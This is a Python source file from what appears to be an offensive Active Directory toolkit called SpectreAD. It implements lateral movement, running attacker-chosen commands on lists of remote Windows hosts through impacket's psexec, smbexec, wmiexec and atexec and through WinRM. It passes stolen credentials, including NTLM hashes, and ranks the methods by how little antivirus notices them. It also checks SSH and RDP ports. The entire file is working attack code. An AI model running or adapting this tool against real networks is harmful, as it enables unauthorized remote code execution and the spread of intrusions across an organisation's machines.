"""
SpectreAD :: core/lateral.py
psexec / smbexec / wmiexec / atexec / winrm / ssh / rdp.

Author : Inayat Hussain
"""

from __future__ import annotations

from core import ui
from core.creds import resolve
from core.store import open_store
from core.transport import tcp_open


def exec_order() -> list[str]:
    """Least AV surface first."""
    return ["smbexec", "atexec", "wmiexec", "winrm", "psexec"]


def run(name: str, args) -> None:
    with open_store(args.store) as store:
        cred = resolve(args, store)
        targets = [args.target] if args.target else []
        if getattr(args, "targets", None):
            with open(args.targets) as fh:
                targets += [l.strip() for l in fh if l.strip()]
        if not targets:
            ui.die("no -target / -targets")

        for t in targets:
            ui.edge(f"{name} -> {t}  as {cred.identity()}")
            if args.dry_run:
                ui.info(f"would run: {args.exec_cmd}")
                continue
            try:
                _dispatch(name, t, cred, args)
                store.log(name, "ok", t, args.exec_cmd, cred.identity())
            except Exception as exc:
                ui.fail(f"{t}: {exc}")
                store.log(name, "fail", t, str(exc), cred.identity())


def _dispatch(name, host, cred, args):
    domain, user, pwd, lm, nt = cred.to_impacket()

    if name == "psexec":
        from impacket.examples.psexec import PSEXEC
        PSEXEC(args.exec_cmd, user, pwd, domain, lm, nt, None, None,
               remoteShell=args.shell).run(host)
    elif name == "smbexec":
        from impacket.examples.smbexec import SMBEXEC
        SMBEXEC(args.exec_cmd, user, pwd, domain, lm, nt, None, None,
                share=args.share, remoteShell=args.shell).run(host)
    elif name == "wmiexec":
        from impacket.examples.wmiexec import WMIEXEC
        WMIEXEC(args.exec_cmd, user, pwd, domain, lm, nt, None, None,
                share=args.share, remoteShell=args.shell).run(host)
    elif name == "atexec":
        from impacket.examples.atexec import ATEXEC
        ATEXEC(args.exec_cmd, user, pwd, domain, lm, nt, None, None).run(host)
    elif name == "winrm":
        from core.transport import winrm_session
        sess = winrm_session(host, cred)
        if sess is None:
            raise RuntimeError("pywinrm not installed")
        r = sess.run_cmd(args.exec_cmd)
        print((r.std_out or b"").decode(errors="ignore"))
    elif name == "ssh":
        ui.info("ssh open" if tcp_open(host, 22) else "ssh closed")
    elif name == "rdp":
        ui.info("rdp open" if tcp_open(host, 3389) else "rdp closed")
